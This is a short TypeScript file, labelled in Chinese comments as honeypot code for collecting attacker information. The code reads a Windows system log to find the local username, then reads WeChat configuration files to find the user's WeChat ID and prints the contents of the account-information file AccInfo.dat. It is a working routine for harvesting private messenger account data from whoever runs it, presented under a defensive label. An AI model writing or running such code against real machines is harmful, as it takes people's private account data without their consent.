/**
 * 蜜罐技术：
 * 实现对攻击者的诱捕，从而收集攻击者的信息
 *
 * 存在隐患：
 * 1. 无法保证攻击者的攻击行为不会对蜜罐造成影响
 * 2. 没做好隔离，可能会成为新的攻击源
 */

import fs from 'fs';


// 获取微信id
const getWxid = <T>(path:T) => {
    const data = fs.readFileSync(`C:/Users/${path}/Documents/WeChat Files/All Users/config/config.data`).toString('utf8')
    const reg = /Documents\\WeChat Files\\([^\\]*)/g
    reg.test(data)
    const wxId = RegExp.$1
    getInfo(path,wxId)
    // console.log(RegExp.$1)
}

const getInfo = <T>(path:T,wxId:T) => {
    const data = fs.readFileSync(`C:/Users/${path}/Documents/WeChat Files/${wxId}/config/AccInfo.dat`).toString('utf-8')
    console.log(data)
}

// 获取电脑用户名
fs.readFile('C:/Windows/PFRO.log', (err, data) => {
    const reg = /Users\\([^\\]*)/g
    reg.test(data.toString('utf16le'))
    const username = RegExp.$1
    getWxid(username)
    // console.log(RegExp.$1);
})